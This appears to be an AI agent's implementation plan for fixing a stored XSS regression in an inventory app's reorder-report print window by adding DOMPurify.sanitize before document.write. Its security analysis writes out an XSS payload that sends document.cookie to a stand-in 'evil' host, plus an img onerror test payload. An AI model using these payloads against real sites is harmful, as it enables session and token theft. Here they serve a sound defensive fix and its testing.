# fix/print-reorder-report-document-write-xss — Implementation Plan

## 0. Scope & methodology note (per anti-hallucination protocol)

**Severity, as framed by the task:** Critical stored XSS. **Correction for accuracy (does not change the fix):** the codebase's own established taxonomy classifies this exact bug *class* as **Moderate**, not Critical — both the archived ledger section header (`tools/SK8Lytz_Bucket_List.md:124`, `#### 🟠 Moderate — Unguarded Print Window document.write`) and `scripts/xss-audit.js`'s own rule definition (`UNGUARDED_DOCUMENT_WRITE`, `severity: 'MODERATE'`, line 138) agree. This plan proceeds exactly as if it were Critical (same fix, same urgency, same verification rigor) — the note is here only so the severity language in commits/testing-guide output is precise, not to argue the task down in priority.

Every citation below was independently re-`Read`/`Grep`'d against the current on-disk state of `assets/js/inventory-module.js`, `assets/js/production-module.js`, `assets/js/packerz-module.js`, `assets/js/print-module.js`, `assets/js/kpi-reports-module.js`, `index.html`, `scripts/xss-audit.js`, `.githooks/pre-commit`, and `tools/SK8Lytz_Bucket_List.md` — not trusted blindly from the task prompt or the ledger.

**Line-number drift confirmed:** the ledger cites `inventory-module.js:1091–1097`. The function `window.printReorderReport` currently starts at **line 887**; the single unguarded `document.write` call is at **line 1059** (the file has grown/shifted since the epic was archived on 2026-07-01). All snippets below are quoted from the file as it reads right now.

**No Supabase schema/table/column/RLS change required — confirmed.** No Supabase query is added, removed, or altered anywhere in this fix. `tools/SK8Lytz_App_Master_Reference.md`'s `## Database Schemas` section requires no update.

**No button/modal/UI element is created, deleted, or moved — confirmed.** The `🖨️ Low Stockz Report` button (`index.html:1904`, `data-click="click_printReorderReport"`) is untouched; only internal sanitization logic inside the handler changes. The Mermaid Architectural Blueprint topological-integrity rule does not apply.

---

## 1. Investigation findings — answering every "also investigate" item explicitly

### 1.1 Was this function already supposed to be covered by the archived `debt/security` epic? — Yes, and the fix regressed.

`tools/SK8Lytz_Bucket_List.md:124-129` (`#### 🟠 Moderate — Unguarded Print Window document.write`, archived under Epic "Technical Debt Sweep — Security Hardening + DOM Hygiene (Full)", `main`, archived 2026-07-01) lists **five** sibling instances, all tagged `[🚀]` (released):

1. `production-module.js:2545–2626` (SOP print window)
2. `packerz-module.js:925–1008` (SOP print window)
3. `print-module.js:880–956` (SOP print window)
4. **`inventory-module.js:1091–1097` — this exact reorder-report function**
5. `production-module.js:2419–2425` (work order print window)

with the documented fix pattern: *"run `DOMPurify.sanitize(html)` on the assembled string before passing to `document.write`."*

**Live-code cross-check of all five (2026-07-19/20/21 state):**

| # | File | `DOMPurify.sanitize(` present at the `document.write` call site? |
|---|---|---|
| 1 | `production-module.js:2620` (SOP) | ✅ Yes — `const safe = DOMPurify.sanitize(html); win.document.write(safe);` |
| 2 | `packerz-module.js:967` | ✅ Yes — identical pattern |
| 3 | `print-module.js:956` | ✅ Yes — identical pattern |
| 4 | **`inventory-module.js:1059`** | **❌ No — `win.document.write(html)`, raw, unsanitized** |
| 5 | `production-module.js:2422` (work order) | ✅ Yes — identical pattern, single-line-compact style |

**Conclusion: 4 of 5 sibling fixes are genuinely live and correct today. This one function — `printReorderReport` — is the sole regression.** It is not a "genuinely separate/newer code path never touched by that epic"; it was named explicitly by line range in the archived, `[🚀]`-tagged entry, and the fix is simply absent from the file today. Most likely explanation (not provable from git blame alone without deeper archaeology, and not required to fix the bug): the sanitize-and-write line was lost during a later unrelated edit/merge to this same function (the function has clearly been edited since — current line 1059 differs in window size (`900,700` vs the sibling `800,600`/`800,800`) and structure from a fresh, never-fixed instance would suggest, but the specific `DOMPurify.sanitize(html);` clause is simply gone). **Recommend logging this as its own Technical Debt lesson at `/wind-down`** (a `[🚀]`-tagged, archived ledger entry does not guarantee the fix is still present in the file weeks later — archived-epic completion claims should get a live re-grep spot-check during periodic `/health_check` runs, not just trusted at merge time) — not fixed in this task, which is scoped to closing the hole itself.

### 1.2 Is there a second `document.write` call (e.g. a separate CSS/style write) that also needs treatment?

**No.** Grepped `assets/js/inventory-module.js` for `document\.write\(` — **exactly one match, line 1059**. Read the full `printReorderReport` function (lines 887-1061) top to bottom: the `<style>` block is built inline as part of the same `html` string (line 889, `<style>body{...}...</style>`) and is written to the popup document in the single `document.write(html)` call at line 1059. There is no separate `win.document.write(styleString)` second call anywhere in this function (unlike some print-window patterns elsewhere in the codebase that do split style/content — this one does not). Nothing else to fix on this axis.

### 1.3 Is there ANY other unguarded sink elsewhere in `inventory-module.js` not already covered by the two prior XSS-fix branches this session?

Grepped every `.innerHTML =`, `.insertAdjacentHTML(`, `.outerHTML =`, and `document.write(` occurrence in the file (32 hits total, full file re-read of each). Result:

- **All 31 `innerHTML`/`insertAdjacentHTML` sites are already correctly guarded** — either `window.safeHTML(...)` wrapping dynamic content, or CLAUDE.md's explicitly-allowed static-literal/empty-clear pattern (e.g. line 2352 `selectBox.innerHTML = ''`, line 2607 a hardcoded "Loading..." literal with no interpolation).
- Lines 2719-2720 (`const safeH = window.safeHTML(h); historyContainer.innerHTML = safeH;`) and the `PC_HISTORY_UPDATE` broadcast at line ~2725 are the exact fix already shipped by the sibling branch `fix/remote-scanner-history-xss` (confirmed identical to that plan's diff) — present and correct, not touched by this task.
- **Line 1059 — `win.document.write(html)` — is the only unguarded sink in the entire file.** No other `document.write` call exists in this file, and no new sink was introduced by `fix/remote-scanner-history-xss` or `fix/cc-mobile-bridge-sync-bugs` (neither branch touches `printReorderReport`, confirmed by re-reading the full function and finding no trace of either branch's known changes here).

**Adjacent finding, explicitly out of scope (do not fix in this branch):** `assets/js/kpi-reports-module.js:130-162` (`window.printKPIReport`) has the **identical unguarded pattern** — `printWin.document.write(\`...${title}...${content}...\`)` with zero `DOMPurify.sanitize()` call, where `content = contentEl.innerHTML` (the currently-rendered KPI report DOM, which may itself contain unsanitized DB-sourced text depending on which report is active). This is a different file, a different button, and was never named in this task's ledger entry or the archived epic's list of five. Flagging it here per the Verification Mandate ("show the receipts," don't bury adjacent findings) and recommending a new, separate `tools/SK8Lytz_Bucket_List.md` § Technical Debt entry at `/wind-down` — **not fixed in this branch**, to keep this a minimal, surgical, single-purpose security hotfix per the task's explicit instruction not to over-engineer or expand scope.

### 1.4 Does the calling context genuinely have `window.safeHTML`/`DOMPurify` already available? — Confirmed yes.

- `index.html:19` loads DOMPurify 3.0.5 from CDN with SRI (`<script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.0.5/purify.min.js" integrity="sha384-..." crossorigin="anonymous">`), synchronous, no `defer`/`async`, near the top of `<head>`.
- `index.html:6183` loads `assets/js/neogleamz-engine.js` (defines `window.safeHTML`, which itself calls `DOMPurify.sanitize(...)`).
- `index.html:6188` loads `assets/js/inventory-module.js` — **after** both of the above, in document order.
- `printReorderReport` is attached as `window.printReorderReport` and invoked only via a `data-click="click_printReorderReport"` token routed through `system-event-delegator.js:283`, itself loaded inside the same `index.html` script graph — never as a standalone page (unlike `tools/remote-scanner.html`/`tools/remote-capture.html`, which the two prior XSS-fix branches this session had to add their own local DOMPurify `<script>` tag + `window.safeHTML` shim for).

**Conclusion: the global `DOMPurify` object is guaranteed present by the time `printReorderReport` can possibly run.** No new CDN tag, no new shim, no `WHOLE_DOCUMENT` option, no change to `neogleamz-engine.js` is needed or appropriate here — matching the task's explicit instruction.

### 1.5 Exact call form to use — matched to the live sibling precedent, not invented

Read the three currently-correct sibling fixes verbatim:

- `production-module.js:2422` (work order print, same compact one-liner style as our target): `` html += `</tbody></table></body></html>`; let win = window.open('', '', 'width=800,height=600'); const safe = DOMPurify.sanitize(html); win.document.write(safe); win.document.close(); setTimeout(() => win.print(), 250); ``
- `packerz-module.js:964-970` (multi-line style): `const safe = DOMPurify.sanitize(html); win.document.write(safe);`
- `print-module.js:954-957` (multi-line style): same.

All three call `DOMPurify.sanitize(html)` **with no options object** — plain default DOMPurify config, no `WHOLE_DOCUMENT: true`. This plan mirrors that exactly, including matching `production-module.js:2422`'s single-physical-line compact style, since `inventory-module.js:1059` is already written in that same compact one-liner form.

---

## 2. The fix — exact before/after

**File:** `assets/js/inventory-module.js`
**Function:** `window.printReorderReport` (starts line 887)
**Line:** 1059 (single line, no other lines in the function change)

### Before
```js
        html += `</body></html>`; let win = window.open('', '', 'width=900,height=700'); win.document.write(html); win.document.close(); setTimeout(() => win.print(), 250);
```

### After
```js
        html += `</body></html>`; let win = window.open('', '', 'width=900,height=700'); const safe = DOMPurify.sanitize(html); win.document.write(safe); win.document.close(); setTimeout(() => win.print(), 250);
```

**Diff form:**
```diff
-        html += `</body></html>`; let win = window.open('', '', 'width=900,height=700'); win.document.write(html); win.document.close(); setTimeout(() => win.print(), 250);
+        html += `</body></html>`; let win = window.open('', '', 'width=900,height=700'); const safe = DOMPurify.sanitize(html); win.document.write(safe); win.document.close(); setTimeout(() => win.print(), 250);
```

That is the entire code change: insert `const safe = DOMPurify.sanitize(html);` and change `win.document.write(html)` → `win.document.write(safe)`. One line, two edits within it. No other line in `inventory-module.js`, `index.html`, or any other file changes.

**Why not `window.safeHTML(html)` instead of raw `DOMPurify.sanitize(html)`:** CLAUDE.md's DOM security section documents both as allowed, but explicitly carves out the print-window case as the one place raw `DOMPurify.sanitize()` (not the `window.safeHTML` wrapper) is the canonical pattern — and all three live sibling fixes use `DOMPurify.sanitize(html)` directly, not `window.safeHTML(html)`. Using `window.safeHTML` here would also pull in `neogleamz-engine.js`'s `ADD_TAGS: ['iframe','video','source']` allowlist additions, which are irrelevant/unwanted for a print document and not used by any of the three sibling print-window fixes. Matching the established sibling precedent exactly, not introducing a variant.

---

## 3. Security analysis

**Vulnerability:** stored XSS via `win.document.write(html)`, where `html` (built starting line 888) interpolates, per deficit row (lines 1046, 1055): `x.nn` (`catalogCache[k].neoName` — "Neogleamz Name"), `x.n` (`catalogCache[k].itemName` — "Item Name"), `x.sp` (`catalogCache[k].spec` — "Specification"), all sourced from `full_landed_costs`-backed `finalResults` rows via `buildCatalogCache()` (`index.html:5960-6030`) with **zero escaping** before template-literal interpolation. It also interpolates recipe/component names (`d.n`, `displayName`, lines 1003-1030) from `productsDB`/`catalogCache`, all DB-editable free text.

**Attack:** an operator (or anyone with write access to the underlying inventory-catalog fields, e.g. via the EDITZ pane's `m_neo_name`/`m_name`/`m_spec` inputs) sets an item's Neogleamz Name, Item Name, or Specification to a payload such as `<img src=x onerror="alert(document.cookie)">` or `<script>fetch('https://evil/steal?c='+document.cookie)</script>`. Any user who later clicks **🖨️ Low Stockz Report** while that item is in deficit triggers `document.write` of the raw payload into a same-origin popup window, executing arbitrary JS in that user's authenticated session (session-cookie theft, Supabase token exfiltration via `localStorage`, or DOM-based pivoting back into the opener window via `window.opener`).

**Fix mechanism:** `DOMPurify.sanitize(html)` parses the assembled string as HTML, strips all `<script>` tags, event-handler attributes (`onerror`, `onclick`, etc.), and `javascript:`-scheme URLs, and returns an inert-but-visually-equivalent HTML string. `document.write(safe)` then writes only sanitized markup — the malicious tag/attribute never reaches the popup's live DOM. Legitimate structural HTML (`<table>`, `<style>`, `<div style="...">`, `<span>`, `<strong>`) used throughout this report is preserved by DOMPurify's default allowlist, so the report's visual layout is unaffected (proof: this is the same default config already proven safe-and-functional across three sibling print-window fixes with structurally identical `<table>`/`<div>`/`<style>` content).

**Forbidden-ternary check:** the fix uses unconditional `DOMPurify.sanitize(html)` — no `window.safeHTML ? window.safeHTML(x) : x` pattern, no conditional fallback of any kind. Matches the one CLAUDE.md-sanctioned form.

**RLS implications:** none introduced or affected. No Supabase query is added/removed/altered by this fix — `catalogCache`/`productsDB`/`finalResults` are already-fetched, already-in-memory client state by the time `printReorderReport` runs; this fix only changes what happens to that data during DOM/document construction. The underlying RLS posture on `full_landed_costs` (which fields an authenticated operator can write) is unchanged and out of scope — the correct defense for stored-XSS-via-DB-field is sanitization at every render sink (this fix), not restricting write access at the RLS layer, since these fields are legitimately operator-editable free text.

**Print-window DOMPurify:** this fix *is* the print-window DOMPurify pattern, applied exactly per CLAUDE.md's documented canonical form and matched to the three already-correct sibling call sites.

**Scanner blind-spot note (important context, not a blocker):** `scripts/xss-audit.js`'s `UNGUARDED_DOCUMENT_WRITE` rule requires **both** `document.write(` **and** a template-literal `${` interpolation **on the same physical line**, and separately requires the absence of `DOMPurify.sanitize(` on that same line. Line 1059, both before and after this fix, contains no `${` (the dynamic interpolation happened many lines earlier, at lines 1003-1055, where `html` was being built up — those lines don't call `document.write`). **This means the automated scanner will almost certainly report 0 findings for this exact line both before and after the fix** — it cannot detect this specific "assemble far away, write via a bare variable" pattern (confirmed identical blind spot already documented in the sibling `fix-remote-scanner-history-xss` plan §4 for a different file). This is why the task's own verification instructions correctly require a live exploit reproduction rather than relying on the scanner alone — do that (§5 below), and do not treat "0 scanner findings" as proof of anything for this specific line. **Not fixed here** (enhancing `hasDynamic()` to catch bare-variable `document.write`/`innerHTML` assignments is a larger, unscoped, sitewide-triage-requiring change per the sibling plan's own §4/§6.3 reasoning) — recommend the same follow-up already logged by that sibling plan, not duplicated as a new item.

---

## 4. Vanilla JS / framework constraints

The fix uses only `DOMPurify.sanitize()` (already-loaded global, no new dependency), `const` (no `var` introduced — matches the file's existing `let`/`const` style in this function), native `window.open()`/`.document.write()`/`.document.close()`. No framework code introduced. Web Bluetooth untouched — this function has no Bluetooth interaction. No new `<script>` tag, no build step.

---

## 5. Verification plan

### 5.1 Pre-fix exploit reproduction (required — run on `main` or on this branch before applying the fix)

1. In STOCKPILEZ → STOCKZ (or via EDITZ pane), set an item's **Specification** field (`m_spec` input, or directly via the EDITZ ledger row edit) to: `<img src=x onerror="alert('XSS-PROOF: '+document.cookie)">`
2. Ensure that item's stock is below its configured Min Stock (so it appears in the Supply Chain Deficits table) — or temporarily raise its Min Stock via the item's audit/edit UI to force a deficit.
3. Click **🖨️ Low Stockz Report**.
4. **Expected pre-fix:** an `alert()` fires in the popup print window containing the live session's `document.cookie` — proof of unauthenticated script execution in a same-origin, authenticated context.
5. Screenshot for the record, then dismiss and revert the test item's Specification field back to a normal value.

### 5.2 Post-fix confirmation (after applying §2's one-line change)

1. Repeat steps 1-3 above exactly (same malicious Specification value, same deficit item).
2. **Expected post-fix:** no `alert()` fires. The print window renders the Supply Chain Deficits table with the malicious string shown as inert visible text (or with the `<img>` tag stripped and surrounding text intact) — either outcome is acceptable proof of non-execution. Confirm via the popup's DevTools → Elements panel that no live `<img>`/`onerror` attribute exists in the actual rendered DOM.
3. Repeat with a benign Specification value (e.g. `50m, gold`) and confirm the report still renders correctly — table columns, values, styling all intact, proving DOMPurify's default allowlist does not break legitimate report content.
4. Revert the test item's Specification field back to its original value.

### 5.3 Automated scans (post-task validation swarm, per CLAUDE.md)

- `node scripts/xss-audit.js --warn` on `assets/js/inventory-module.js` — expect 0 findings for line 1059 both before and after (per §3's scanner blind-spot note — this is expected, not a red flag; do not mistake "0 findings" for "nothing to fix" without also doing §5.1/§5.2's manual reproduction).
- `node scripts/xss-audit.js` (blocking mode, matches the actual pre-commit invocation) — must exit 0 on the full repo scan after the fix is applied.
- `npm test` / `npx eslint .` — no existing test file references `printReorderReport` (confirmed via grep of `tests/`, including `tests/inventory-engine.test.js`); expect no new failures, no new coverage added (this cluster has zero pre-existing automated coverage).

---

## 6. 4-state UX

**Not materially applicable as a new requirement** — `printReorderReport` is a synchronous, in-memory report generator (no async Supabase fetch inside the function itself; it reads already-loaded `catalogCache`/`productsDB`/`inventoryDB` module-level state). It already implements the relevant states given its nature:
- **Empty:** explicitly handled — line 975-976 shows a green "✅ All production products are at or above optimal stock levels" message when `deficits.length === 0`; line 1049-1050 shows "✅ All monitored raw stock levels are optimal" when `items.length === 0`.
- **Error:** the whole function body is wrapped in `try { ... } catch (e) { sysLog(e.message, true); }` (lines 888, 1060) — an exception logs via `sysLog` rather than crashing; no user-facing error UI inside the popup itself, but this is pre-existing behavior, unrelated to and unchanged by this fix.
- **Loading/Success:** not applicable in the async-spinner sense — the popup window opens and is populated synchronously; there is no intermediate loading state to preserve.

This fix changes zero UX states — it only changes what content is written into the (already-existing) success-path popup. No 4-state work is required or introduced.

---

## 7. UI mutex

**Not applicable.** `printReorderReport` performs no Supabase/DB mutation — it is a read-only report generator over already-loaded client state. `window.executeWithButtonAction` is reserved for DB-mutation buttons per CLAUDE.md; the `🖨️ Low Stockz Report` button correctly does not use it today, and this fix does not change that.

---

## 8. Zero-refresh

**Not applicable.** No render function needs re-invocation after this fix — there is no async mutation here to propagate. The popup window's content generation is triggered fresh on every click; nothing to keep in sync across views.

---

## 9. Schema changes

**None — confirmed.** No `CREATE`/`ALTER TABLE`, no RLS policy change, no new Supabase query anywhere in this fix. `tools/SK8Lytz_App_Master_Reference.md`'s `## Database Schemas` section requires no update. Per the ledger-exemption rule, the Master Reference and Bucket List are not touched in this task's commit regardless (they sync at `/wind-down`).

---

## 10. Risks

1. **Low — single-line, mechanical change, directly mirroring three already-proven-correct sibling call sites in the same codebase.** Minimal regression surface.
2. **Low — DOMPurify's default allowlist could theoretically strip a legitimate tag/attribute used in the report's own static markup** (e.g. inline `style="..."` attributes, `<table>`/`<th>`/`<td>`). Mitigated by the fact that the three sibling fixes use identical default-config `DOMPurify.sanitize()` against structurally similar `<table>`/`<div style="...">`-heavy content today with no reported breakage — §5.2's benign-value manual test is the explicit proof step for this report's own markup.
3. **Low — the pre-existing scanner blind spot (§3) means CI alone cannot prove this fix landed correctly.** Mitigated by making the manual exploit-reproduction test (§5.1/§5.2) an explicit, mandatory part of this task's verification, not optional.
4. **None — no schema, no RLS, no new dependency, no other file touched.**

---

## 11. Manual testing guide

### 🧪 Manual Testing Guide — Reorder Report Print-Window Stored-XSS Fix

**Browser:** Chrome 120+ (required — DOMPurify + print/popup behavior).
**Environment:** `http://127.0.0.1:5500` (local) or `https://neogleamz.github.io` (live, post-deploy).
**Prerequisites:** logged-in Neogleamz OS session with edit access to at least one STOCKZ/EDITZ inventory item; popup blocker disabled for the test origin (the report opens via `window.open`).

#### ✅ Happy Path
1. Navigate to **STOCKPILEZ** → **STOCKZ** sub-pane.
2. Click **🖨️ Low Stockz Report** in the pane header action bar (top-right, next to ⏳ Velocityz).
3. Expected result: a new popup window opens titled "Neogleamz Reorder Report," showing the "🚨 Low Stock Reorder Report" header, a "🏭 Production Targets Build List" section (either the deficit tree or the green "✅ All production products are at or above optimal stock levels" message), and a "📦 Supply Chain Deficits (Order These)" table (or its own green "all optimal" message) with correct item names, specs, stock levels, and cost totals. The browser print dialog auto-opens shortly after (per the `setTimeout(() => win.print(), 250)` call).

#### ❌ Error & Edge Cases
1. Set an inventory item's Specification (or Item Name / Neogleamz Name) field to `<img src=x onerror="alert('XSS-PROOF: '+document.cookie)">`, force that item into deficit (stock below Min Stock), then click **🖨️ Low Stockz Report**. Expected: **no `alert()` fires**; the payload appears as inert text or is stripped entirely — this is the core regression test for this fix (see §5.1/§5.2 above for full before/after reproduction steps).
2. Trigger the report with zero deficits anywhere (all stock at/above Min Stock). Expected: both "all optimal" green success messages render, no crash, no blank popup.
3. Trigger the report with a popup blocker enabled. Expected: `window.open` may return `null`/blocked — pre-existing behavior, unrelated to this fix, not required to be "fixed" here; just confirm no unrelated console error is introduced by the DOMPurify change itself.

#### 🔁 Regression Checks (nearby features — verify nothing broke)
- **⏳ Velocityz** modal (same pane header) still opens and functions normally.
- **📦 Cycle Counts** and **📋 Snapshots** buttons (same pane header) still function normally.
- Other print-window reports elsewhere in the app — **Production SOP print**, **Packerz SOP print**, **Print-module SOP print**, **Production work-order print** — still render and print correctly (these already use the identical `DOMPurify.sanitize()` pattern; confirm this fix did not somehow affect shared state — it does not, since each is an independent function in a different file, but worth a quick spot-check given they share the exact fix pattern).
- The EDITZ pane's manual-entry fields (`m_spec`, `m_name`, `m_neo_name`) still save and display normally after testing with the malicious test value (confirm the value round-trips as inert text everywhere else it's rendered — e.g. STOCKZ table cells — which already use `window.safeHTML(...)`-guarded rendering, unaffected by this fix).

#### 🗄️ Database Verification
No DB schema or row-shape changes — this fix does not add, alter, or remove any Supabase read or write. If you used a real inventory item's Specification field for the exploit test (§5.1), verify in the Supabase dashboard → `full_landed_costs` (or the relevant catalog-source table) that the field was correctly reverted to its original value after testing, with no orphaned malicious string left in production data.

---

## Files Touched

- **`assets/js/inventory-module.js`** — the only file changed. `window.printReorderReport` (line 887), single line 1059: insert `const safe = DOMPurify.sanitize(html);` before the `document.write` call and change `win.document.write(html)` → `win.document.write(safe)`. No other line in this file changes.

**Not touched (confirmed):**
- `index.html` — DOMPurify CDN tag (line 19) and script-load order already correctly provide the global `DOMPurify` object to `inventory-module.js`; read for verification only, not modified. No button/modal/UI element created, deleted, or moved.
- `assets/js/production-module.js`, `assets/js/packerz-module.js`, `assets/js/print-module.js` — already-correct sibling print-window fixes; read for verification/pattern-matching only, not modified.
- `assets/js/kpi-reports-module.js` — adjacent unguarded `document.write` finding in `printKPIReport` (§1.3) discovered during investigation but **explicitly out of scope for this branch**; recommend a new, separate Technical Debt ledger entry at `/wind-down`.
- `assets/js/neogleamz-engine.js` — `window.safeHTML` definition read for context; not modified (this fix intentionally uses raw `DOMPurify.sanitize()` per §2's reasoning, matching sibling precedent).
- `scripts/xss-audit.js` — scanner blind spot documented (§3) but not fixed here; same follow-up already logged by the sibling `fix-remote-scanner-history-xss` plan, not duplicated.
- `.githooks/pre-commit` — already correctly runs `node scripts/xss-audit.js` in blocking mode; no change needed, this fix is what keeps that scan (and, more importantly, the live exploit) closed.
- `tools/SK8Lytz_App_Master_Reference.md` — no schema/RLS/UI-topology change (§9); ledger-exemption rule defers any doc sync to `/wind-down`.
- `tools/SK8Lytz_Bucket_List.md` — ledger-exemption rule; recommend at `/wind-down`: (a) mark this task `[x]`, (b) log the `kpi-reports-module.js:printKPIReport` adjacent finding (§1.3) as new Technical Debt, (c) log the "archived `[🚀]` epic completion claims can regress silently — spot-check live code during `/health_check`, not just trust the tag" lesson (§1.1).
- `tests/` — zero existing coverage for `printReorderReport` (confirmed via grep of `tests/inventory-engine.test.js`); no new automated test added — this is a one-line sanitization fix verified via the manual exploit reproduction in §5, matching this repo's established pattern for print-window XSS fixes (none of the three already-fixed siblings have dedicated unit tests either).

## Suggested commit message

Single micro-commit (one logical fix, matching this repo's cadence):

`fix(inventory): sanitize reorder report HTML before document.write to close stored-XSS regression`
